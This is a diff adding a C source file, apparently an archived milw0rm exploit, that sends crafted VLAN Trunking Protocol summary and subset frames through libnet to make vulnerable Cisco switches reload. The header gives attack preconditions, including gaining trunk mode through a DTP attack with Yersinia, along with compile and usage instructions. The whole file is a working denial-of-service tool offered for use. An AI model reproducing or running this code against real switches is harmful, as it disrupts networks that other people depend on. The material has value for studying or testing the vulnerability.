@@ -1,0 +1,188 @@
+/*DoS code for Cisco VLAN Trunking Protocol Vulnerability
+ *
+ *vulerability discription:
+ *http://www.cisco.com/warp/public/707/cisco-sr-20081105-vtp.shtml
+ *
+ *To Known:
+ * 1.the switch must in Server/Client Mode.
+ * 2.the port ,attacker connected,must be in trunk Mode.
+ *   Cisco Ethernet ports with no configuration are not
+ *   in trunk.but trunk mode can be obtained through DTP
+ *   attack by Yersinia.
+ * 3.you must known the vtp domain,this can be sniffed
+ * 4.some codes are from Yersinia.
+ *
+ *Result:
+ * switch reload.
+ *
+ *
+ *Compile:
+ * gcc -o vtp `libnet-config --libs` vtp.c
+ *
+ *Usage:vtp -i <interface> -d <vtp_domain>
+ *
+ *Contact: showrun.lee[AT]gmail.com
+ *http://sh0wrun.blogspot.com/
+ */
+#include <libnet.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define VTP_DOMAIN_SIZE    32
+#define VTP_TIMESTAMP_SIZE 12
+
+struct vtp_summary {
+     u_int8_t  version;
+     u_int8_t  code;
+     u_int8_t  followers;
+     u_int8_t  dom_len;
+     u_int8_t  domain[VTP_DOMAIN_SIZE];
+     u_int32_t revision;
+     u_int32_t updater;
+     u_int8_t  timestamp[VTP_TIMESTAMP_SIZE];
+     u_int8_t  md5[16];
+};
+
+struct vtp_subset {
+     u_int8_t  version;
+     u_int8_t  code;
+     u_int8_t  seq;
+     u_int8_t  dom_len;
+     u_int8_t  domain[VTP_DOMAIN_SIZE];
+     u_int32_t revision;
+};
+
+void usage( char *s) {
+    printf("%s -i <interface> -d <vtp domain>\n",s);
+    exit (1);
+}
+
+int main( int argc, char *argv[] )
+{
+    int opt,k=0;
+    extern char *optarg;
+    libnet_ptag_t t;
+    libnet_t *lhandler;
+    u_int32_t vtp_len=0, sent;
+    struct vtp_summary *vtp_summ;
+    struct vtp_subset *vtp_sub;
+    u_int8_t *vtp_packet,*vtp_packet2, *aux;
+    u_int8_t cisco_data[]={ 0x00, 0x00, 0x0c, 0x20, 0x03 };
+    u_int8_t dst_mac[6]={ 0x01,0x00,0x0c,0xcc,0xcc,0xcc };
+    u_int8_t aaa[8]={ 0x22,0x00,0x11,0x22,0x11,0x00, 0x00,0x00 };
+    struct libnet_ether_addr *mymac;
+    char *device;
+    char error_information[LIBNET_ERRBUF_SIZE];
+    char *domain;
+
+// get options
+     while ((opt = getopt(argc, argv, "i:d:")) != -1)
+     {
+          switch (opt) {
+          case 'i':
+          device=malloc(strlen(optarg));
+          strcpy(device,optarg);
+      k=1;
+          break;
+
+          case 'd':
+          domain=malloc(strlen(optarg));
+          strcpy(domain,optarg);
+          break;
+         
+          default: usage(argv[0]);
+          }
+     }
+     if(!k) { printf("  %s -i <interface> -d <vtp domain>\n     must assign the interface\n",argv[0]);exit(1);}
+
+//init libnet
+
+    lhandler=libnet_init(LIBNET_LINK,device,error_information);
+    if (!lhandler) {
+             fprintf(stderr, "libnet_init: %s\n", error_information);
+             return -1;
+     }
+
+    mymac=libnet_get_hwaddr(lhandler);
+//build the first packet for vtp_summary
+    vtp_len = sizeof(cisco_data)+sizeof(struct vtp_summary);
+    vtp_packet = calloc(1,vtp_len);
+    aux = vtp_packet;
+    memcpy(vtp_packet,cisco_data,sizeof(cisco_data));
+    aux+=sizeof(cisco_data);
+    vtp_summ = (struct vtp_summary *)aux;
+    vtp_summ->version = 0x01;
+    vtp_summ->code = 0x01;//vtp_summary
+    vtp_summ->followers = 0x01;
+    vtp_summ->dom_len = strlen(domain);
+    memcpy(vtp_summ->domain,domain,strlen(domain));
+    vtp_summ->revision = htonl(2000);//bigger than the current revision number will ok
+    t = libnet_build_802_2(
+        0xaa,            /* DSAP */
+        0xaa,            /* SSAP */
+        0x03,            /* control */
+        vtp_packet,      /* payload */
+        vtp_len,         /* payload size */
+        lhandler,        /* libnet handle */
+        0);              /* libnet id */
+    t = libnet_build_802_3(
+        dst_mac,       /* ethernet destination */
+        mymac->ether_addr_octet,     /* ethernet source */
+        LIBNET_802_2_H + vtp_len, /* frame size */
+        NULL,                     /* payload */
+        0,                        /* payload size */
+        lhandler,                 /* libnet handle */
+        0);                       /* libnet id */
+
+     sent = libnet_write(lhandler);
+
+     if (sent == -1) {
+        libnet_clear_packet(lhandler);
+        free(vtp_packet);
+        return -1;
+     }
+     libnet_clear_packet(lhandler);
+    
+//build the second vtp packet for vtp_subset
+     vtp_len = sizeof(cisco_data)+sizeof(struct vtp_subset);
+     vtp_packet2 = calloc(1,vtp_len);
+     aux = vtp_packet2;
+     memcpy(vtp_packet2,cisco_data,sizeof(cisco_data));
+     aux+=sizeof(cisco_data);
+    
+     vtp_sub = (struct vtp_subset *)aux;
+     vtp_sub->version = 0x01;
+     vtp_sub->code = 0x02; //vtp_subset
+     vtp_sub->seq = 0x01;
+     vtp_sub->dom_len = strlen(domain);
+     memcpy(vtp_sub->domain,domain,strlen(domain));
+     vtp_sub->revision = htonl(2000);//bigger than the current revision number will ok
+//     memcpy(vtp_sub->aaa,aaa,strlen(aaa));
+    
+    t = libnet_build_802_2(
+        0xaa,            /* DSAP */
+        0xaa,            /* SSAP */
+        0x03,            /* control */
+        vtp_packet2,      /* payload */
+        vtp_len,         /* payload size */
+        lhandler,        /* libnet handle */
+        0);              /* libnet id */
+    t = libnet_build_802_3(
+        dst_mac,       /* ethernet destination */
+        mymac->ether_addr_octet,     /* ethernet source */
+        LIBNET_802_2_H + vtp_len, /* frame size */
+        NULL,                     /* payload */
+        0,                        /* payload size */
+        lhandler,                 /* libnet handle */
+        0);                       /* libnet id */
+
+     sent = libnet_write(lhandler);
+     if (sent == -1) {
+        libnet_clear_packet(lhandler);
+        free(vtp_packet);
+        return -1;
+     }
+     libnet_clear_packet(lhandler);
+}
+
+// milw0rm.com [2009-01-14]
